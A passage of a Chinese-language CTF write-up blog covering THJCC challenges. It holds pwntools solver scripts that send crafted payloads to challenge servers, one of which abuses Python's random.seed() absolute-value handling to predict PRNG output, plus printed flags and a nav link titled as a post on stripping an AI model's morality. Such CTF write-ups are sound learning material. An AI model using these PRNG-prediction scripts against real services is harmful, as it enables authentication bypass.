class="string">&quot;所有設定都失敗，請試更大 scale 或更多 iter&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 準備 payload</span></span><br><span class="line">payload = <span class="string">&#x27;,&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;v:<span class="number">.10</span>f&#125;</span>&quot;</span> <span class="keyword">for</span> v <span class="keyword">in</span> best_overall_x.view(-<span class="number">1</span>).tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n最終最佳 x: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;本地預期輸出: <span class="subst">&#123;best_overall_output:<span class="number">.6</span>f&#125;</span> (loss: <span class="subst">&#123;best_overall_loss:<span class="number">.10</span>f&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== 連線部分 ====================</span></span><br><span class="line">r = remote(<span class="string">&#x27;chal.thjcc.org&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n送出...&quot;</span>)</span><br><span class="line">r.sendline(payload.encode())</span><br><span class="line"></span><br><span class="line">response = r.recvall(timeout=<span class="number">5</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nServer 回應:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>flag：THJCC{Stoc4st1c_W3ight_D3sc3nt_M4st3r_xedrftginjk54896ghjbijkml52563201}</p>
</blockquote>
<h2 id="NEURAL-OVERRIDE"><a href="#NEURAL-OVERRIDE" class="headerlink" title="NEURAL_OVERRIDE"></a>NEURAL_OVERRIDE</h2><p><img src="https://hackmd.io/_uploads/Sk9RBhF_Ze.png" alt="image"><br>題目有伊綱诶<br>超喜歡<br><img src="https://hackmd.io/_uploads/ByOVJ6FObg.png" alt="螢幕擷取畫面 2026-02-21 173458"><br>這題我也不知道發生什麼事<br>丟了一個他提供的<code>.pt</code>檔我就過了<br>然後現在過不了也不知道怎麼解釋的XD</p>
<blockquote>
<p>flag：THJCC{y0ur_ar3_the_adv3rs3r1al_attack_m0st3r}</p>
</blockquote>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="676767"><a href="#676767" class="headerlink" title="676767"></a>676767</h2><p>six seven~</p>
<p><code>random.seed(x)</code> 在處理整數 <code>x</code> 時，底層實作會自動取絕對值 <code>abs(x)</code><br>利用題目限制了 <code>a = 0</code> 或 <code>a = 1</code> 會直接退出程式<br>輸入 <code>a = -1</code> 且 <code>b = 0</code>，使得 <code>a*seed + b</code> 的計算結果為 <code>-seed</code>。透過絕對值轉換<br><code>random.seed(-seed</code>) 的狀態會完美還原成初始的 <code>random.seed(seed)</code><br>程式開頭洩漏的 10 個數字是使用 <code>random.getrandbits(256)</code> 產生的<br>但在後續的驗證階段，使用的是 <code>random.randrange(base</code>)<br>題目的 <code>base</code> 是一個略小於 $2^{256}$ 的大整數<br>    當 Python 執行 <code>randrange(base)</code> 時，會先呼叫 <code>getrandbits(256)</code><br>若抽出的數字 $\ge base$，就會觸發拒絕採樣並重新抽樣。這個隱含的重新抽樣會額外消耗 PRNG 的內部狀態，導致我們預測的序列與伺服器發生錯位驗證失敗<br>寫腳本不斷重新連線（刷首抽），直到伺服器洩漏的 10 個數字全部都 $&lt; base$。在這種完美開局下，<code>randrange(base)</code> 絕對不會觸發重新抽樣，我們即可將這 10 個數字原封不動送回，順利通過驗證</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 題目設定的 base 值</span></span><br><span class="line">base = <span class="number">86844066927987146567678238756515930889952488499230423029593188005934867676767</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 關閉 pwntools 預設的連線開關提示，讓終端機畫面乾淨一點</span></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    attempts = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 開始暴力刷首抽尋找幸運數列...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        attempts += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 連線到題目伺服器</span></span><br><span class="line">            r = remote(<span class="string">&#x27;chal.thjcc.org&#x27;</span>, <span class="number">48764</span>)</span><br><span class="line">            </span><br><span class="line">            vals = []</span><br><span class="line">            <span class="comment"># 讀取並解析前 10 個數字</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                line = r.recvline().decode().strip()</span><br><span class="line">                val = <span class="built_in">int</span>(line.replace(<span class="string">&#x27;&lt; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                vals.append(val)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 檢查這 10 個數字是否「全部」都小於 base</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(v &lt; base <span class="keyword">for</span> v <span class="keyword">in</span> vals):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 在第 <span class="subst">&#123;attempts&#125;</span> 次連線時找到幸運數列！開始進行攻擊...&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 繞過 random.seed() 的保護機制 (利用取絕對值的特性)</span></span><br><span class="line">                r.sendlineafter(<span class="string">b&quot;a&gt;&quot;</span>, <span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">                r.sendlineafter(<span class="string">b&quot;b&gt;&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 將這 10 個幸運數字照順序送回去</span></span><br><span class="line">                <span class="keyword">for</span> v <span class="keyword">in</span> vals:</span><br><span class="line">                    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(v).encode())</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 接收最後的 Flag</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] 成功！伺服器回應：&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(r.recvall().decode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 運氣不好，裡面有大於或等於 base 的數字，直接斷線重來</span></span><br><span class="line">                r.close()</span><br><span class="line">                <span class="keyword">if</span> attempts % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[*] 已經嘗試了 <span class="subst">&#123;attempts&#125;</span> 次，繼續尋找中...&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="comment"># 處理伺服器意外斷線的狀況</span></span><br><span class="line">            r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
<div id="comment-card" class="comment-card">
  <div class="main-title-bar">
    <div class="main-title-dot"></div>
    <div class="main-title">Comments</div>
  </div>
  <div id="giscus_thread"></div>
  <script>
    (function () {
      const giscusConfig = {
        repo: "huiink/huiink-comments",
        repoId: "R_kgDOQ09UcA",
        category: "General",
        categoryId: "DIC_kwDOQ09UcM4C0p8X",
        mapping: "pathname",
        strict: "0",
        reactionsEnabled: "1",
        emitMetadata: "0",
        inputPosition: "bottom",
        lang: "zh-TW",
        loading: "lazy"
      };

      function currentTheme() {
        const explicitTheme = document.documentElement.getAttribute('theme');
        if (explicitTheme === 'dark') return "dark";
        if (explicitTheme === 'light') return "light";
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
          return "dark";
        }
        return "light";
      }

      function mountGiscus() {
        const host = document.getElementById('giscus_thread');
        if (!host) return;
        if (host.querySelector('script[src="https://giscus.app/client.js"]')) return;

        const script = document.createElement('script');
        script.src = 'https://giscus.app/client.js';
        script.async = true;
        script.crossOrigin = 'anonymous';
        script.setAttribute('data-repo', giscusConfig.repo);
        script.setAttribute('data-repo-id', giscusConfig.repoId);
        script.setAttribute('data-category', giscusConfig.category);
        script.setAttribute('data-category-id', giscusConfig.categoryId);
        script.setAttribute('data-mapping', giscusConfig.mapping);
        script.setAttribute('data-strict', giscusConfig.strict);
        script.setAttribute('data-reactions-enabled', giscusConfig.reactionsEnabled);
        script.setAttribute('data-emit-metadata', giscusConfig.emitMetadata);
        script.setAttribute('data-input-position', giscusConfig.inputPosition);
        script.setAttribute('data-theme', currentTheme());
        script.setAttribute('data-lang', giscusConfig.lang);
        script.setAttribute('data-loading', giscusConfig.loading);
        host.appendChild(script);
      }

      function syncGiscusTheme() {
        const iframe = document.querySelector('iframe.giscus-frame');
        if (!iframe || !iframe.contentWindow) return;
        iframe.contentWindow.postMessage(
          { giscus: { setConfig: { theme: currentTheme() } } },
          'https://giscus.app'
        );
      }

      mountGiscus();

      const observer = new MutationObserver(function (mutations) {
        for (const mutation of mutations) {
          if (mutation.attributeName === 'theme') syncGiscusTheme();
        }
      });
      observer.observe(document.documentElement, {
        attributes: true,
        attributeFilter: ['theme']
      });

      window.addEventListener('load', function () {
        syncGiscusTheme();
        setTimeout(syncGiscusTheme, 800);
      });
    })();
  </script>
</div>
        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2026/02/28/%E6%A8%A1%E5%9E%8B%E9%81%93%E5%BE%B7%E5%88%87%E9%99%A4%E4%B9%8B%E5%AF%A6%E4%BD%9C/"
      title="模型道德切除與智力修復之實作"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        模型道德切除與智力修復之實作
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2026/01/09/11401FhCTFWriteup/"
      title="11401FhCTF Writeup"
     >

    <p class="title-text">
      
        11401FhCTF Writeup
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2026 老祖<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>

<script>
  window.MathJax = {
    tex: {
      inlineMath: [['\u0024', '\u0024'], ['\\(', '\\)']],
      displayMath: [['\u0024\u0024', '\u0024\u0024'], ['\\[', '\\]']],
      processEscapes: true
    },
    options: {
      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
  };
</script>
<script defer src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
</body>
</html>
